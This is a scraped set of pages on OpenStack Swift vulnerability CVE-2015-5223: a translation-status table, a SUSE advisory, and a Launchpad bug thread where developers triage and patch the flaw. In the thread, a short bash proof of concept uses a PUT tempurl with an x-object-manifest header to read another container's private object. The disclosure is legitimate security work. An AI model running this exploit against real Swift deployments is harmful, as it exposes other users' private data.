| [French](/swift/trunk/%2Bpots/swift/fr/%2Btranslate) | 136 030.61  69.38775510204081% translated  30.612244897959183% untranslated | 60 [60](/swift/trunk/%2Bpots/swift/fr/%2Btranslate?show=untranslated) | 102 [102](/swift/trunk/%2Bpots/swift/fr/%2Btranslate?show=new_suggestions) | 2013-02-14 06:49:01 UTC 2013-02-14 |
| [Galician](/swift/trunk/%2Bpots/swift/gl/%2Btranslate) | 26 086.73  13.26530612244898% translated  86.73469387755102% untranslated | 170 [170](/swift/trunk/%2Bpots/swift/gl/%2Btranslate?show=untranslated) | 10 [10](/swift/trunk/%2Bpots/swift/gl/%2Btranslate?show=new_suggestions) | 2013-07-10 19:50:03 UTC 2013-07-10 |
| [German](/swift/trunk/%2Bpots/swift/de/%2Btranslate) | 196 000.00  100.0% translated | 0 0 | 0 0 | 2013-03-13 09:30:18 UTC 2013-03-13 |
| [Greek](/swift/trunk/%2Bpots/swift/el/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/el/%2Btranslate?show=untranslated) | 108 [108](/swift/trunk/%2Bpots/swift/el/%2Btranslate?show=new_suggestions) | 2016-08-01 08:02:55 UTC 2016-08-01 |
| [Gujarati](/swift/trunk/%2Bpots/swift/gu/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/gu/%2Btranslate?show=untranslated) | 0 0 | 2012-02-27 11:00:53 UTC 2012-02-27 |
| [Hindi](/swift/trunk/%2Bpots/swift/hi/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/hi/%2Btranslate?show=untranslated) | 0 0 | 2011-11-22 03:08:28 UTC 2011-11-22 |
| [Indonesian](/swift/trunk/%2Bpots/swift/id/%2Btranslate) | 156 020.41  79.59183673469387% translated  20.408163265306122% untranslated | 40 [40](/swift/trunk/%2Bpots/swift/id/%2Btranslate?show=untranslated) | 30 [30](/swift/trunk/%2Bpots/swift/id/%2Btranslate?show=new_suggestions) | 2013-03-05 07:35:08 UTC 2013-03-05 |
| [Italian](/swift/trunk/%2Bpots/swift/it/%2Btranslate) | 114 041.84  58.16326530612245% translated  41.83673469387755% untranslated | 82 [82](/swift/trunk/%2Bpots/swift/it/%2Btranslate?show=untranslated) | 82 [82](/swift/trunk/%2Bpots/swift/it/%2Btranslate?show=new_suggestions) | 2011-12-21 14:12:36 UTC 2011-12-21 |
| [Japanese](/swift/trunk/%2Bpots/swift/ja/%2Btranslate) | 196 000.00  100.0% translated | 0 0 | 0 0 | 2011-05-05 13:19:23 UTC 2011-05-05 |
| [Kabyle](/swift/trunk/%2Bpots/swift/kab/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/kab/%2Btranslate?show=untranslated) | 0 0 | 2020-09-26 09:29:14 UTC 2020-09-26 |
| [Kazakh](/swift/trunk/%2Bpots/swift/kk/%2Btranslate) | 4 097.96  2.0408163265306123% translated  97.95918367346938% untranslated | 192 [192](/swift/trunk/%2Bpots/swift/kk/%2Btranslate?show=untranslated) | 0 0 | 2012-12-24 06:23:42 UTC 2012-12-24 |
| [Korean](/swift/trunk/%2Bpots/swift/ko/%2Btranslate) | 100 048.98  51.02040816326531% translated  48.97959183673469% untranslated | 96 [96](/swift/trunk/%2Bpots/swift/ko/%2Btranslate?show=untranslated) | 7 [7](/swift/trunk/%2Bpots/swift/ko/%2Btranslate?show=new_suggestions) | 2013-04-15 23:12:08 UTC 2013-04-15 |
| [Kurdish](/swift/trunk/%2Bpots/swift/ku/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/ku/%2Btranslate?show=untranslated) | 3 [3](/swift/trunk/%2Bpots/swift/ku/%2Btranslate?show=new_suggestions) | 2017-07-26 21:01:28 UTC 2017-07-26 |
| [Latvian](/swift/trunk/%2Bpots/swift/lv/%2Btranslate) | 1 099.49  0.5102040816326531% translated  99.48979591836735% untranslated | 195 [195](/swift/trunk/%2Bpots/swift/lv/%2Btranslate?show=untranslated) | 0 0 | 2013-03-07 16:08:25 UTC 2013-03-07 |
| [Malay](/swift/trunk/%2Bpots/swift/ms/%2Btranslate) | 196 000.00  100.0% translated | 0 0 | 0 0 | 2013-06-09 04:03:12 UTC 2013-06-09 |
| [Norwegian Bokmal](/swift/trunk/%2Bpots/swift/nb/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/nb/%2Btranslate?show=untranslated) | 1 [1](/swift/trunk/%2Bpots/swift/nb/%2Btranslate?show=new_suggestions) | 2014-01-16 13:09:36 UTC 2014-01-16 |
| [Occitan (post 1500)](/swift/trunk/%2Bpots/swift/oc/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/oc/%2Btranslate?show=untranslated) | 46 [46](/swift/trunk/%2Bpots/swift/oc/%2Btranslate?show=new_suggestions) | 2012-02-07 14:18:38 UTC 2012-02-07 |
| [Polish](/swift/trunk/%2Bpots/swift/pl/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/pl/%2Btranslate?show=untranslated) | 11 [11](/swift/trunk/%2Bpots/swift/pl/%2Btranslate?show=new_suggestions) | 2018-12-03 18:23:39 UTC 2018-12-03 |
| [Portuguese](/swift/trunk/%2Bpots/swift/pt/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/pt/%2Btranslate?show=untranslated) | 193 [193](/swift/trunk/%2Bpots/swift/pt/%2Btranslate?show=new_suggestions) | 2018-07-08 18:34:04 UTC 2018-07-08 |
| [Romanian](/swift/trunk/%2Bpots/swift/ro/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/ro/%2Btranslate?show=untranslated) | 10 [10](/swift/trunk/%2Bpots/swift/ro/%2Btranslate?show=new_suggestions) | 2020-03-14 17:38:36 UTC 2020-03-14 |
| [Russian](/swift/trunk/%2Bpots/swift/ru/%2Btranslate) | 121 038.27  61.73469387755102% translated  38.265306122448976% untranslated | 75 [75](/swift/trunk/%2Bpots/swift/ru/%2Btranslate?show=untranslated) | 52 [52](/swift/trunk/%2Bpots/swift/ru/%2Btranslate?show=new_suggestions) | 2012-12-24 06:28:21 UTC 2012-12-24 |
| [Spanish](/swift/trunk/%2Bpots/swift/es/%2Btranslate) | 196 000.00  100.0% translated | 0 0 | 5 [5](/swift/trunk/%2Bpots/swift/es/%2Btranslate?show=new_suggestions) | 2013-07-10 19:28:26 UTC 2013-07-10 |
| [Swedish](/swift/trunk/%2Bpots/swift/sv/%2Btranslate) | 6 096.94  3.061224489795918% translated  96.93877551020408% untranslated | 190 [190](/swift/trunk/%2Bpots/swift/sv/%2Btranslate?show=untranslated) | 190 [190](/swift/trunk/%2Bpots/swift/sv/%2Btranslate?show=new_suggestions) | 2013-01-15 19:54:17 UTC 2013-01-15 |
| [Tajik](/swift/trunk/%2Bpots/swift/tg/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/tg/%2Btranslate?show=untranslated) | 0 0 | 2020-07-23 06:12:29 UTC 2020-07-23 |
| [Thai](/swift/trunk/%2Bpots/swift/th/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/th/%2Btranslate?show=untranslated) | 28 [28](/swift/trunk/%2Bpots/swift/th/%2Btranslate?show=new_suggestions) | 2017-05-12 11:57:17 UTC 2017-05-12 |
| [Tibetan](/swift/trunk/%2Bpots/swift/bo/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/bo/%2Btranslate?show=untranslated) | 0 0 | 2019-12-12 02:01:45 UTC 2019-12-12 |
| [Turkish](/swift/trunk/%2Bpots/swift/tr/%2Btranslate) | 21 089.29  10.714285714285714% translated  89.28571428571429% untranslated | 175 [175](/swift/trunk/%2Bpots/swift/tr/%2Btranslate?show=untranslated) | 77 [77](/swift/trunk/%2Bpots/swift/tr/%2Btranslate?show=new_suggestions) | 2013-03-31 20:57:29 UTC 2013-03-31 |
| [Ukrainian](/swift/trunk/%2Bpots/swift/uk/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/uk/%2Btranslate?show=untranslated) | 196 [196](/swift/trunk/%2Bpots/swift/uk/%2Btranslate?show=new_suggestions) | 2013-09-20 17:58:38 UTC 2013-09-20 |
| [Uyghur](/swift/trunk/%2Bpots/swift/ug/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/ug/%2Btranslate?show=untranslated) | 1 [1](/swift/trunk/%2Bpots/swift/ug/%2Btranslate?show=new_suggestions) | 2012-03-18 09:34:30 UTC 2012-03-18 |
| [Vietnamese](/swift/trunk/%2Bpots/swift/vi/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/vi/%2Btranslate?show=untranslated) | 1 [1](/swift/trunk/%2Bpots/swift/vi/%2Btranslate?show=new_suggestions) | 2012-11-23 04:10:25 UTC 2012-11-23 |

[ [Change your preferred languages...](/%2Beditmylanguages)
—
View all languages
]

![Key to this table: “Unchanged” means](/@@/green-bar)
Translated

![and “untranslated” means just that,](/@@/red-bar)
Untranslated

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from www.suse.com_2a1a36de_20250126_062853.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2015-5223.html)
[English](https://www.suse.com/security/cve/CVE-2015-5223.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2015-5223.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2015-5223.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2015-5223.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2015-5223.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2015-5223.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2015-5223.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2015-5223

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2015-5221.html) [[Index]](index.html) [[Next]](CVE-2015-5224.html)

### Upstream information

[CVE-2015-5223 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5223)

#### Description

OpenStack Object Storage (Swift) before 2.4.0 allows attackers to obtain sensitive information via a PUT tempurl and a DLO object manifest that references an object in another container.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [moderate](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 5 |
| Vector | AV:N/AC:L/Au:N/C:P/I:N/A:N |
| Access Vector | Network |
| Access Complexity | Low |
| Authentication | None |
| Confidentiality Impact | Partial |
| Integrity Impact | None |
| Availability Impact | None |

SUSE Bugzilla entry: [942641](https://bugzilla.suse.com/show_bug.cgi?id=942641) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [SUSE-SU-2015:1846-1](https://lists.suse.com/pipermail/sle-security-updates/2015-October/001652.html), published Fri Oct 30 05:09:48 MDT 2015

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| SUSE OpenStack Cloud 5 | * `openstack-swift >= 2.1.0-11.1` * `openstack-swift-account >= 2.1.0-11.1` * `openstack-swift-container >= 2.1.0-11.1` * `openstack-swift-doc >= 2.1.0-11.1` * `openstack-swift-object >= 2.1.0-11.1` * `openstack-swift-proxy >= 2.1.0-11.1` * `python-swift >= 2.1.0-11.1` | Patchnames: sleclo50sp3-openstack-swift-12171 |
| SUSE OpenStack Cloud 6 | * `openstack-swift >= 2.1.0-4.1` * `openstack-swift-account >= 2.1.0-4.1` * `openstack-swift-container >= 2.1.0-4.1` * `openstack-swift-object >= 2.1.0-4.1` * `openstack-swift-proxy >= 2.1.0-4.1` * `python-swift >= 2.1.0-4.1` | Patchnames: SUSE OpenStack Cloud 6 GA openstack-swift-2.1.0-3.1 |

---

### Status of this issue by product and package

Please note that this evaluation state might be work in progress, incomplete or outdated. Also information for service packs in the LTSS phase is only included for issues meeting the LTSS criteria. If in doubt, feel free to contact us for clarification. The updates are grouped by state of their lifecycle. SUSE product lifecycles are documented [on the lifecycle page](https://www.suse.com/lifecycle/).

| Product(s) | Source package | State |
| --- | --- | --- |
| Products past their end of life and not receiving proactive updates anymore. | | |
| SUSE Cloud 2.0 | openstack-swift | Already fixed |
| SUSE Cloud 4 | openstack-swift | Ignore |
| SUSE Cloud 4 Dependencies | openstack-swift | Already fixed |
| SUSE Cloud 5 | openstack-swift | Released |
| SUSE OpenStack Cloud 5 | openstack-swift | Released |
| SUSE OpenStack Cloud 5 | openstack-swift-doc | Released |
| Products at an unknown state of their lifecycle. | | |
| SUSE OpenStack Cloud 2.0 | openstack-swift | Already fixed |
| SUSE OpenStack Cloud 4 | openstack-swift | Already fixed |

---

### SUSE Timeline for this CVE

CVE page created: Fri Aug 21 10:58:30 2015

CVE page last modified: Tue Jul 2 16:35:23 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from bugs.launchpad.net_3869d116_20250125_055209.html ===

[Log in / Register](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Blogin)

[![](https://launchpadlibrarian.net/52141984/os64.png)](https://launchpad.net/swift)

## [OpenStack Object Storage (swift)](https://launchpad.net/swift)

* [Overview](https://launchpad.net/swift)
* [Code](https://code.launchpad.net/swift)
* [Bugs](https://bugs.launchpad.net/swift)
* [Blueprints](https://blueprints.launchpad.net/swift)
* [Translations](https://translations.launchpad.net/swift)
* [Answers](https://answers.launchpad.net/swift)

# [OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)

Bug #1453948 reported by
[clayg](https://launchpad.net/~clay-gerrard)
on 2015-05-11

[264](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [OpenStack Object Storage (swift)](https://bugs.launchpad.net/swift) | Fix Released | Critical | Unassigned | [OpenStack Object Storage (swift) 2.4.0](https://launchpad.net/swift/%2Bmilestone/2.4.0) |
|  | [OpenStack Security Advisory](https://bugs.launchpad.net/ossa) | Fix Released | Medium | [Tristan Cacqueray](https://launchpad.net/~tristan-cacqueray) |  |

### Bug Description

If you get a PUT tempurl you can use DLO's to find objects in the container, or in the account.

If you are allowed to upload a DLO via PUT tempurl and the application that generated the tempurl believes it safe to generate a GET tempurl for the data they just authorized you to upload - they may accidentally authorize you to download any previously discovered data.

We should not allow uses to PUT DLO's via tempurl - it's currently insecure because of the existence leak attack; and can be difficult to reason about safely for application authors generating tempurls.

See [original description](comments/0)

Tags:

[in-feature-crypto](/swift/%2Bbugs?field.tag=in-feature-crypto)
[in-feature-hummingbird](/swift/%2Bbugs?field.tag=in-feature-hummingbird)
[in-stable-juno](/swift/%2Bbugs?field.tag=in-stable-juno)
[in-stable-kilo](/swift/%2Bbugs?field.tag=in-stable-kilo)

## CVE References

* [2015-5223](/bugs/cve/2015-5223 "OpenStack Object Storage (Swift) befo...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-11: |  |  | [#1](/swift/%2Bbug/1453948/comments/1) |
| --- | --- | --- | --- |

* [show how to use any PUT tempurl to probe for object/container existance](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4395824/%2Bfiles/put-tempurl-dlo-leak.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4395824)
  (2.1 KiB,
  text/x-diff)

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-05-12

| Changed in ossa: | |
| --- | --- |
| **status**: | New → Confirmed |
| **importance**: | Undecided → Medium |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-14: |  |  | [#2](/swift/%2Bbug/1453948/comments/2) |
| --- | --- | --- | --- |

I have a feeling this might be a significant enough behavior change (breaking a workflow which application developers might already have encoded into their software) that we wouldn't be able to safely backport it without having it as an optional mitigation that defaults to the original behavior. Then deployers can choose explicitly to disallow PUT DLO's via tempurl in their environments without forcing it on all deployments consuming stable branches.

If we do end up making it configurable and leave the original behavior as the default, then this is territory for documenting in a security note not an advisory.

I have a feeling this might be a significant enough behavior change (breaking a workflow which application developers might already have encoded into their software) that we wouldn't be able to safely backport it without having it as an optional mitigation that defaults to the original behavior. Then deployers can choose explicitly to disallow PUT DLO's via tempurl in their environments without forcing it on all deployments consuming stable branches.
If we do end up making it configurable and leave the original behavior as the default, then this is territory for documenting in a security note not an advisory.

| Changed in ossa: | |
| --- | --- |
| **status**: | Confirmed → Incomplete |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-10: |  |  | [#3](/swift/%2Bbug/1453948/comments/3) |
| --- | --- | --- | --- |

Can someone triage the swift bug ?

This looks like a type B\* bug ( <https://security.openstack.org/vmt-process.html#incident-report-taxonomy> ).

Unless someone object, we'll subscribe ossg-coresec next Monday.

Can someone triage the swift bug ?
This looks like a type B\* bug ( https://security.openstack.org/vmt-process.html#incident-report-taxonomy ).
Unless someone object, we'll subscribe ossg-coresec next Monday.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-06-12: |  |  | [#4](/swift/%2Bbug/1453948/comments/4) |
| --- | --- | --- | --- |

Tristan, this bug and [https://bugs.launchpad.net/swift/+bug/1449212](https://bugs.launchpad.net/swift/%2Bbug/1449212) are closely related and should only be disclosed at the same time.

Tristan, this bug and https://bugs.launchpad.net/swift/+bug/1449212 are closely related and should only be disclosed at the same time.

| Changed in swift: | |
| --- | --- |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-06-12: |  |  | [#5](/swift/%2Bbug/1453948/comments/5) |
| --- | --- | --- | --- |

I'm not sure if this is a class B1 or class A bug yet. I definitely think this needs to be fixed on master. If we do end up blocking DLOs with tempurls (or at least creating DLOs with tempurls), then we need to decide if it's better to leave old versions vulnerable or change their behavior with a security update. My default response is to fix the bug and backport it.

I'm not sure if this is a class B1 or class A bug yet. I definitely think this needs to be fixed on master. If we do end up blocking DLOs with tempurls (or at least creating DLOs with tempurls), then we need to decide if it's better to leave old versions vulnerable or change their behavior with a security update. My default response is to fix the bug and backport it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-15: |  |  | [#6](/swift/%2Bbug/1453948/comments/6) |
| --- | --- | --- | --- |

Alright, so if it's a class A, then we could update the impact description of [bug 1449212](/bugs/1449212) to cover both bug within the same advisory.

Else, then let's get OSSG on board for this one to work on a security note.

Alright, so if it's a class A, then we could update the impact description of bug 1449212 to cover both bug within the same advisory.
Else, then let's get OSSG on board for this one to work on a security note.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-06-23: |  |  | [#7](/swift/%2Bbug/1453948/comments/7) |
| --- | --- | --- | --- |

* [400 PUT tempurls that have a x-object-manifest header](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4418957/%2Bfiles/fix-tempurl-dlo-surprise.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4418957)
  (7.2 KiB,
  text/plain)

sorry, been busy - attached patch for review

Here's some bash that works on a swift-all-in-one to get you started:

#!/bin/bash

    # resetswift

    set -e

    echo "password" > secret

    swift upload private secret

    swift post -H 'x-account-meta-temp-url-key: mykey'

    # create a container for people to upload stuff too

    swift post public

    # attacker: "yes hello, can I have a safe place to upload some of my data?"

    PUT\_TEMPURL\_SIG="$(swift tempurl PUT 60 /v1/AUTH\_test/public/your-thing mykey)"

    curl -XPUT -H 'x-object-manifest: private/secret' "<http://localhost:8080>${PUT\_TEMPURL\_SIG}" -d ''

    # attacker: "oh yes, that data I just uploaded - can I download it please?"

    PUT\_TEMPURL\_SIG="$(swift tempurl GET 60 /v1/AUTH\_test/public/your-thing mykey)"

    # attacker: only... it's not \*MY\* data - trolrolrololollolo

    echo ""

    echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

    curl "<http://localhost:8080>${PUT\_TEMPURL\_SIG}"

    echo ""

    echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

sorry, been busy - attached patch for review
Here's some bash that works on a swift-all-in-one to get you started:
#!/bin/bash
# resetswift
set -e
echo "password" > secret
swift upload private secret
